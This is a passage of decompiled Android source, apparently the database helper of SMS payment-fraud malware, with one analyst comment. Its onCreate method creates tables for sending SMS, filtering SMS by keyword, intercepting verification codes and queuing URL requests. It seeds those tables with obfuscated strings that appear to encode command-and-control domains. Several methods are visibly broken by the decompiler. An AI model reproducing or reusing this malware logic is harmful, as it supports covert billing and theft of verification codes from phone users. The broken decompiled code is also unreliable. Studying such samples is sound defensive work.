        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean Yja1OJm(String str) {
        int i;
        Exception e;
        synchronized (this) {
            if (OL.ND89akd((Object) str)) {
                return false;
            }
            try {
                Cursor query = getReadableDatabase().query("orders", new String[]{"resToCp"}, "cpoid=?", new String[]{str}, null, null, null);
                i = (query == null || !query.moveToFirst()) ? 0 : query.getInt(query.getColumnIndex("resToCp"));
                if (query != null) {
                    try {
                        query.close();
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        if (i == 1) {
                        }
                        return r0;
                    }
                }
            } catch (Exception e3) {
                e = e3;
                i = 0;
            }
            boolean z = i == 1;
            return z;
        }
    }

    public final String bC(String str) {
        String str2;
        SQLException e;
        String str3;
        synchronized (this) {
            str2 = "";
            try {
                Cursor query = getReadableDatabase().query("tasklist", null, "soid=?", new String[]{str}, null, null, "id");
                if (query != null && query.moveToFirst()) {
                    str2 = query.getString(query.getColumnIndex("moid"));
                }
                if (query != null) {
                    try {
                        query.close();
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return str2;
                    }
                }
            } catch (SQLException e3) {
                e = e3;
                str2 = str3;
            }
        }
        return str2;
    }

    public final String f6ksTc(String str) {
        Exception e;
        String str2;
        String str3 = null;
        synchronized (ND89akd) {
            try {
                Cursor query = getWritableDatabase().query("orders", new String[]{"oid"}, "cpoid=?", new String[]{str}, null, null, null);
                if (query == null || !query.moveToFirst()) {
                    str2 = null;
                } else {
                    str2 = query.getString(query.getColumnIndex("oid"));
                    try {
                        query.close();
                    } catch (Exception e2) {
                        e = e2;
                        str3 = str2;
                        e.printStackTrace();
                        str2 = str3;
                        return str2;
                    }
                }
            } catch (Exception e3) {
                e = e3;
            }
        }
        return str2;
    }

    public final int k9op(String str) {
        int i;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("verify_intercept_info", null, "soid=?", new String[]{str}, null, null, null);
                i = query != null ? query.getCount() : 0;
                if (query != null) {
                    try {
                        query.close();
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return i;
                    }
                }
            } catch (SQLException e3) {
                e = e3;
                i = 0;
            }
        }
        return i;
    }

    public final HI ln8DL(String str) {
        Exception e;
        HI hi;
        HI hi2 = null;
        synchronized (ND89akd) {
            try {
                hi = new HI();
            } catch (Exception e2) {
                e = e2;
            }
            try {
                Cursor query = getReadableDatabase().query("orders", null, "cpoid =?", new String[]{str}, null, null, null);
                if (query != null && query.moveToFirst()) {
                    query.getInt(query.getColumnIndex("id"));
                    hi.ND89akd(query.getString(query.getColumnIndex("oid")));
                    hi.Uyns1s(query.getString(query.getColumnIndex("gid")));
                    hi.owdCd(query.getString(query.getColumnIndex("cpoid")));
                    hi.ui2Abh(query.getString(query.getColumnIndex("ext")));
                }
                if (query != null) {
                    query.close();
                }
            } catch (Exception e3) {
                e = e3;
                hi2 = hi;
                e.printStackTrace();
                hi = hi2;
                return hi;
            }
        }
        return hi;
    }

    public final boolean m4T(String str) {
        Cursor query;
        synchronized (this) {
            try {
                query = getReadableDatabase().query("tasklist", null, "soid =? and type !=? and status !=? and type !=? and type !=?", new String[]{str, "0", "1", "5", "6"}, null, null, null);
            } catch (SQLException e) {
                e.printStackTrace();
            }
            if (query == null || !query.moveToFirst()) {
                if (query != null) {
                    query.close();
                }
                return true;
            }
            query.close();
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0042  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x004e  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean nmpPdk(String str) {
        int i;
        Exception e;
        boolean z = true;
        synchronized (this) {
            if (OL.ND89akd((Object) str)) {
                return false;
            }
            try {
                Cursor query = getReadableDatabase().query("orders", new String[]{"id"}, "cpoid=?", new String[]{str}, null, null, null);
                i = (query == null || !query.moveToFirst()) ? 0 : query.getInt(query.getColumnIndex("id"));
                if (query != null) {
                    try {
                        query.close();
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        if (i > 0) {
                        }
                        return z;
                    }
                }
            } catch (Exception e3) {
                e = e3;
                i = 0;
            }
            if (i > 0) {
                z = false;
            }
            return z;
        }
    }


    // [fmss] This method executes SQL queries to create tables that will contain different kind of informations, from SMS messages to 
    // payments configurations
    @Override // android.database.sqlite.SQLiteOpenHelper
    public final void onCreate(SQLiteDatabase sQLiteDatabase) {
        try {
            sQLiteDatabase.execSQL("create table orders(id integer PRIMARY KEY autoincrement,oid text,cpoid text,gid text,ext text,st integer,tp integer,dl integer,resToCp integer,isMPFinished integer)");
            sQLiteDatabase.execSQL("create table send_sms(id integer PRIMARY KEY autoincrement,soid text,subid text,type integer,dt text,st integer,tp integer,btp integer,followed integer,dl integer)");
            sQLiteDatabase.execSQL("create table shield_task(id integer PRIMARY KEY autoincrement,soid text,subid integer,pt text,kw text,st integer,followed integer,btp integer,dl integer)");
            sQLiteDatabase.execSQL("create table verify_intercept_info(id integer PRIMARY KEY autoincrement,soid text,subid integer,cp text,ck text,st integer,followed integer,btp integer,sc integer,dl integer)");
            sQLiteDatabase.execSQL("create table url_access_task (id integer PRIMARY KEY autoincrement,soid text,subid integer,sendtype integer,url text,httpmethod text,httpdata text,httpParams text,httpHeader text,status integer,errorcode integer,followed integer,btp integer,dl integer)");
            sQLiteDatabase.execSQL("create table parsetask(id integer PRIMARY KEY autoincrement,moid text,soid text,subId integer,msg text,st integer,type integer,btp integer,dl integer)");
            sQLiteDatabase.execSQL("create table tasklist(id integer PRIMARY KEY autoincrement,moid text,soid text,subid integer,status integer,type integer,tp integer)");
            sQLiteDatabase.execSQL("create table matched_sms(id integer PRIMARY KEY autoincrement,msg text,port text,tp integer)");
            sQLiteDatabase.execSQL("create table mp_status(id integer PRIMARY KEY autoincrement,type integer,info text,flag integer)");
            sQLiteDatabase.execSQL("CREATE TABLE pay_configure(id INTEGER PRIMARY KEY AUTOINCREMENT,needMobile INTEGER,quickFeedback INTEGER,needConfirm INTEGER,availablePayType TEXT,smsCat TEXT,showResultUI INTEGER,plugins TEXT,needUpdateDomain INTEGER,showLoading INTEGER,preMobile INTEGER,logCount INTEGER,yfId TEXT,yjId TEXT,zzDId TEXT,zzAId TEXT,zzSec TEXT)");
            sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS GSI(sign TEXT PRIMARY KEY , n TEXT, yfS TEXT, yjS TEXT, zzS TEXT, p TEXT, d TEXT)");
            sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS Doms(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, type INTEGER, status INTEGER)");
            sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS Actions(type INTEGER PRIMARY KEY, action TEXT )");
            sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS MopInfo(id INTEGER PRIMARY KEY AUTOINCREMENT, moid TEXT , sdk TEXT, status INTEGER, syncStatus INTEGER )");
            sQLiteDatabase.execSQL("insert into Doms(name,type,status) values " + (com.android.k9op.OL.JUSEF.OL.ND89akd() ? "('N01tZkpNc1pGT1ZjSGNxeWdpZnhlVGFIUjBjRG92TDNCaGVYUmxjM1F4TG0xaGFXMXZZaTV1WlhRV0ZmRm9wd2hJdW9jdk5zRG9YVFZI',3,10),('Nm9hcVdwSmtScER0YUlEWkF6WmFIUjBjRG92TDNCaGVYUmxjM1F4TG0xaGFXMXZZaTV1WlhRc2dCUWFUR3RsR3NpWmt2SWhF',1,10),('NVBHWGxJVUhCY2haSUpZU2FIUjBjRG92TDJ4dlozUmxjM1F4TG0xaGFXMXZZaTV1WlhRRklucGFlRWNFampaa1JP',2,10),('NEhzdEJQRE9Rb3pBYmFIUjBjRG92THpFeE55NHhNelV1TVRRMExqWXpPamd3T0RFRlhNcGNGYXFEWmtv',0,10000)" : "('OG16dWRBcXFISG5CUkJ1bmJPdGNkWERFQmFIUjBjRG92TDNBeExtbHNZWE4wTG1Oamd5YURKVlFqdUtpS1dQTXFEUHVIT0ZvcQ',3,10),('OWJ3Y1FNcnVmUnpWVGl0V0t1WFNTeEx6bnJsQmFIUjBjRG92TDNBeExtbHNZWE4wTG1OakRlaEFCUHdkSVFDV2xjUExsSndhd0ZZQlBjVg',1,10),('NXdGcU1pT1lkZExWTHlqcGFIUjBjRG92TDJ4dlp6RXVhV3hoYzNRdVkyTWhRR3BRaEdPcUNtZU9rWg',2,10),('OGZVRUVkQUVsQWRRRGVqV3FRamhBYkh3RWFIUjBjRG92THpFeE55NHhNelV1TVRRMExqWXpPamd3T0RFcXNxSWl0bXZjT3NVVGNiQ1R5YnlGSlF4',0,10000)"));
            sQLiteDatabase.execSQL("insert into Actions(action,type) values " + (com.android.k9op.OL.JUSEF.OL.ND89akd() ? "('NHN2cXFkVGN3dUNpbkwybHVaR1Y0TG5Cb2NDOU5ReTlJUWdqVXpadmZMQ2puTXg',1),('NUV2cFdJRm9JbmRabGFKT0wybHVaR1Y0TG5Cb2NDOU5ReTlTVUF3ZFROeGtVeXhNSUpFdFI',2),('NlVwT2Zpd2ZPYnp5V1pvVVZHQkwybHVaR1Y0TG5Cb2NDOU5ReTlIUTAxR3pYRGJZWkZkdkZKVEVVU1JLaA',3),('NGJtQlBJRW5icUJoTEwybHVaR1Y0TG5Cb2NDOU5ReTlRU0ZJUXJCelVGTEZGcGts',4),('NkZsb1NwRG94Y21paWdUVWpkaUwybHVaR1Y0TG5Cb2NDOU5ReTlOVDFBSlNzZ3RIbm56WGxVQVhyZkxJ',5),('OXVTb2JSRGVmRFBtTGlmanZ0T0lHSlVmUnNyWEwybHVaR1Y0TG5Cb2NDOU5ReTlNVUFRS1hSWEp3UlBTREFaRnRvYnBneUd5VGJmbVI',7),('NWhLeERzeExteFhFWmxScEwybHVaR1Y0TG5Cb2NDOUVMMFJOVkFXUmVUYXZ5QVp1b0tIVVI',6)" : "('NW1ZVXRabndtcWdhbXZia0wybHVaR1Y0TG5Cb2NDOU5ReTlJUWdGV1pHdFBIcmFOcndLamk',1),('NEZzaWNSU1hvckRaaEwybHVaR1Y0TG5Cb2NDOU5ReTlTVUFZZUx1bHN2akpmTkw',2),('OVJadXllQmRlZ2ZFT2lremhVRGtrSk5lTldrWkwybHVaR1Y0TG5Cb2NDOU5ReTlIUTAxR2NMc0NmamtneENibW5Pc0dHeU1QRUhKcmhNZg',3),('OEJVS0tPa25XWHFVQ0FDREtUZk1Lc1NaSkwybHVaR1Y0TG5Cb2NDOU5ReTlRU0ZJTXNweUpEb1BFeVNkdHRRZGVUeERRVnJo',4),('NHJpdU5rcG9iSXljRkwybHVaR1Y0TG5Cb2NDOU5ReTlOVDFBVGFmanJLSWt0ZFlh',5),('N1JWeEZDdFVDWkVQcFJnc0NnanFMZkwybHVaR1Y0TG5Cb2NDOU5ReTlNVUFheHVheXVIcVpwS01SVGhaQXF0WFI',7),('N3pYbEFVcGxuWkFidGtCcGFsQmpTbkwybHVaR1Y0TG5Cb2NDOUVMMFJOUUVBQWx2bXVjeHJRUHhuUnpPU2Z0',6)"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public final void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {
        if (i == 1 && i2 == 2) {
            sQLiteDatabase.execSQL("ALTER TABLE orders ADD isMPFinished INTEGER");
        }
    }

    public final int owdCd() {
        int i = 0;
        synchronized (this) {
            try {
                i = getWritableDatabase().delete("Doms", "status<?", new String[]{"1"});
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return i;
    }

    public final int owdCd(com.android.k9op.OL.k9op.OL ol) {
        int i = 0;
        synchronized (this) {
            if (!OL.ND89akd(ol)) {
                try {
                    i = getWritableDatabase().update("GSI", Uyns1s(ol), "sign=?", new String[]{ol.ND89akd()});
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return i;
    }

    public final int owdCd(SDS sds) {
        int i = 0;
        synchronized (this) {
            if (sds != null) {
                try {
                    i = getWritableDatabase().update("pay_configure", Uyns1s(sds), "id=?", new String[]{"1"});
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return i;
    }

    public final int owdCd(String str) {
        int i = 0;
        synchronized (this) {
            if (!OL.ND89akd((Object) str)) {
                com.android.k9op.OL.k9op.k9op Uyns1s = Uyns1s(str);
                if (!OL.ND89akd(Uyns1s) && Uyns1s.ND89akd() != 0 && Uyns1s.ui2Abh() > 0) {
                    i = owdCd(Uyns1s.ND89akd(), Uyns1s.ui2Abh() - 1);
                }
            }
        }
        return i;
    }

    public final wjfwe owdCd(String str, int i) {
        wjfwe wjfweVar;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("tasklist", null, "soid=? and subid=?", new String[]{str, String.valueOf(i)}, null, null, "id desc");
                if (query == null || !query.moveToFirst()) {
                    wjfweVar = null;
                } else {
                    wjfweVar = new wjfwe();
                    try {
                        wjfweVar.ND89akd(query.getInt(query.getColumnIndex("id")));
                        wjfweVar.ND89akd(query.getString(query.getColumnIndex("moid")));
                        wjfweVar.owdCd(query.getString(query.getColumnIndex("soid")));
                        wjfweVar.owdCd(Integer.parseInt(query.getString(query.getColumnIndex("subid"))));
                        wjfweVar.Uyns1s(Integer.parseInt(query.getString(query.getColumnIndex("status"))));
                        wjfweVar.ui2Abh(Integer.parseInt(query.getString(query.getColumnIndex("type"))));
                        wjfweVar.ND89akd(Long.parseLong(query.getString(query.getColumnIndex("tp"))));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return wjfweVar;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                wjfweVar = null;
            }
        }
        return wjfweVar;
    }

    public final com.android.k9op.OL.k9op.k9op owdCd(int i) {
        com.android.k9op.OL.k9op.k9op k9opVar;
        synchronized (this) {
            com.android.k9op.OL.k9op.k9op k9opVar2 = new com.android.k9op.OL.k9op.k9op();
            if (i == 0) {
                return k9opVar2;
            }
            try {
                Cursor query = getReadableDatabase().query("Doms", null, "type=?", new String[]{String.valueOf(i)}, null, null, "status desc");
                k9opVar2 = ND89akd(query);
                if (query != null) {
                    query.close();
                }
                k9opVar = k9opVar2;
            } catch (Exception e) {
                e.printStackTrace();
                k9opVar = k9opVar2;
            }
            return k9opVar;
        }
    }

    public final boolean owdCd(String str, String str2) {
        synchronized (ND89akd) {
            try {
                Cursor query = getWritableDatabase().query("tasklist", null, "moid =? and soid !=? and type !=? and type !=? and type !=? and status !=? ", new String[]{str, str2, "0", "5", "6", "1"}, null, null, null);
                if (query != null && query.moveToFirst()) {
                    query.close();
                    return true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
    }

    public final com.android.k9op.OL.anvYnsl.k9op.OL ui2Abh(int i) {
        com.android.k9op.OL.anvYnsl.k9op.OL ol;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("url_access_task", null, "subid=?", new String[]{String.valueOf(i)}, null, null, null);
                if (query == null || !query.moveToFirst()) {
                    ol = null;
                } else {
                    ol = new com.android.k9op.OL.anvYnsl.k9op.OL();
                    try {
                        ol.ND89akd(query.getInt(query.getColumnIndex("id")));
                        ol.ND89akd(query.getString(query.getColumnIndex("soid")));
                        ol.owdCd(query.getInt(query.getColumnIndex("subid")));
                        ol.Uyns1s(query.getInt(query.getColumnIndex("sendtype")));
                        ol.owdCd(query.getString(query.getColumnIndex("url")));
                        ol.Uyns1s(query.getString(query.getColumnIndex("httpmethod")));
                        ol.ui2Abh(query.getString(query.getColumnIndex("httpdata")));
                        ol.OPj2s(query.getString(query.getColumnIndex("httpParams")));
                        ol.uoer5H(query.getString(query.getColumnIndex("httpHeader")));
                        ol.ui2Abh(query.getInt(query.getColumnIndex("status")));
                        ol.OPj2s(query.getInt(query.getColumnIndex("errorcode")));
                        ol.uoer5H(query.getInt(query.getColumnIndex("followed")));
                        ol.ND89akd(query.getLong(query.getColumnIndex("btp")));
                        ol.owdCd(query.getLong(query.getColumnIndex("dl")));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return ol;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                ol = null;
            }
        }
        return ol;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x00c9 A[Catch: all -> 0x00d4, SQLException -> 0x00d7, TRY_LEAVE, TryCatch #0 {SQLException -> 0x00d7, blocks: (B:6:0x000f, B:8:0x0037, B:10:0x003d, B:13:0x00c9), top: B:23:0x000f }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final ArrayList ui2Abh() {
        SQLException e;
        ArrayList arrayList;
        Cursor query;
        ArrayList arrayList2 = null;
        synchronized (this) {
            long currentTimeMillis = System.currentTimeMillis() / 1000;
            try {
                arrayList = new ArrayList();
                try {
                    query = getReadableDatabase().query("parsetask", null, "st=? and btp<=? and dl>=?", new String[]{"0", String.valueOf(currentTimeMillis), String.valueOf(currentTimeMillis)}, null, null, null);
                } catch (SQLException e2) {
                    e = e2;
                    arrayList2 = arrayList;
                    e.printStackTrace();
                    arrayList = arrayList2;
                    return arrayList;
                }
            } catch (SQLException e3) {
                e = e3;
            }
            if (query != null && query.moveToFirst()) {
                do {
                    sqa sqaVar = new sqa();
                    sqaVar.owdCd(query.getInt(query.getColumnIndex("id")));
                    sqaVar.ND89akd(query.getString(query.getColumnIndex("moid")));
                    sqaVar.owdCd(query.getString(query.getColumnIndex("soid")));
                    sqaVar.ND89akd(query.getInt(query.getColumnIndex("subId")));
                    sqaVar.Uyns1s(com.android.k9op.OL.anvYnsl.OL.OL.owdCd(query.getString(query.getColumnIndex("msg")), 3));
                    sqaVar.Uyns1s(query.getInt(query.getColumnIndex("st")));
                    sqaVar.ui2Abh(query.getInt(query.getColumnIndex("type")));
                    sqaVar.ND89akd(query.getInt(query.getColumnIndex("btp")));
                    sqaVar.owdCd(query.getInt(query.getColumnIndex("dl")));
                    arrayList.add(sqaVar);
                } while (query.moveToNext());
                if (query != null) {
                }
            } else if (query != null) {
                query.close();
            }
        }
        return arrayList;
    }

    public final boolean ui2Abh(String str) {
        int i;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("resToCp", (Integer) 1);
                i = writableDatabase.update("orders", contentValues, "cpoid=? and resToCp=?", new String[]{str, "0"});
            } catch (Exception e) {
                e.printStackTrace();
                i = 0;
            }
            return i > 0;
        }
    }

    public final JUSEF uoer5H(int i) {
        JUSEF jusef;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("shield_task", null, "subid=?", new String[]{String.valueOf(i)}, null, null, null);
                if (query == null || !query.moveToFirst()) {
                    jusef = null;
                } else {
                    jusef = new JUSEF();
                    try {
                        jusef.owdCd(query.getInt(query.getColumnIndex("id")));
                        jusef.ND89akd(query.getString(query.getColumnIndex("id")));
                        jusef.ND89akd(query.getInt(query.getColumnIndex("subid")));
                        jusef.owdCd(query.getString(query.getColumnIndex("pt")));
                        jusef.Uyns1s(query.getString(query.getColumnIndex("kw")));
                        jusef.Uyns1s(query.getInt(query.getColumnIndex("st")));
                        jusef.ui2Abh(query.getInt(query.getColumnIndex("followed")));
                        jusef.ND89akd(query.getLong(query.getColumnIndex("btp")));
                        jusef.owdCd(query.getLong(query.getColumnIndex("dl")));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return jusef;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                jusef = null;
            }
        }
        return jusef;
    }

    public final String uoer5H(String str) {
        String str2;
        Exception e;
        Cursor query;
        synchronized (ND89akd) {
            String str3 = "";
            try {
                query = getReadableDatabase().query("orders", new String[]{"cpoid"}, "oid =?", new String[]{str}, null, null, null);
            } catch (Exception e2) {
                e = e2;
            }
            if (query != null && query.moveToFirst()) {
                str2 = query.getString(query.getColumnIndex("cpoid"));
                try {
                    query.close();
                } catch (Exception e3) {
                    e = e3;
                    str3 = str2;
                    e.printStackTrace();
                    str2 = str3;
                    return str2;
                }
            }
            str2 = str3;
        }
        return str2;
    }

    public final void uoer5H() {
        nmpPdk();
        f6ksTc();
        k9op();
        bC();
        YNc();
        ln8DL();
    }
}
